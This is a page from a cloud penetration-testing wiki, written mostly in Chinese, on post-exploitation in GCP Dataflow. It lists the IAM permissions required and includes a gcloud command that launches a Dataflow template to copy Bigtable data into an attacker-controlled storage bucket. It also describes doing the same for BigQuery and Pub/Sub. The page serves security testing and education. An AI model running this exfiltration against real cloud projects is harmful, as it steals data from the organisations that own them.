# GCP - Dataflow Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

欲了解有关 Dataflow 的更多信息，请参阅：

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### 使用 Dataflow 来 exfiltrate 来自其他服务的数据

**权限：** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`（针对拥有对源和 sink 访问权限的 SA）

拥有 Dataflow 作业创建权限后，你可以使用 GCP Dataflow 模板将 Bigtable、BigQuery、Pub/Sub 等服务的数据导出到攻击者控制的 GCS 桶中。当你获得 Dataflow 访问权限时（例如通过 [Dataflow Rider](../gcp-privilege-escalation/gcp-dataflow-privesc.md) privilege escalation（通过 bucket 写入接管 pipeline）），这是一个强大的 post-exploitation 技术。

> [!NOTE]
> 你需要对具有足够权限以读取源并写入 sink 的 service account (SA) 拥有 `iam.serviceAccounts.actAs`。默认情况下，如果未指定，将使用 Compute Engine 默认 SA。

#### Bigtable to GCS

参见 [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md#dump-rows-to-your-bucket) — "Dump rows to your bucket" 获取完整模式。 模板：`Cloud_Bigtable_to_GCS_Json`, `Cloud_Bigtable_to_GCS_Parquet`, `Cloud_Bigtable_to_GCS_SequenceFile`.

<details>

<summary>将 Bigtable 导出到攻击者控制的 bucket</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<YOUR_BUCKET>/raw-json/ \
--staging-location=gs://<YOUR_BUCKET>/staging/
```
</details>

#### BigQuery 到 GCS

Dataflow templates exist to export BigQuery data. 使用适合目标格式（JSON、Avro 等）的模板，并将输出指向你的存储桶。

#### Pub/Sub 和流式来源

流式管道可以从 Pub/Sub（或其他来源）读取并写入到 GCS。使用一个从目标 Pub/Sub 订阅读取并写入到你控制的存储桶的模板来启动作业。

## 参考

- [Dataflow templates](https://cloud.google.com/dataflow/docs/guides/templates/provided-templates)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md)

{{#include ../../../banners/hacktricks-training.md}}
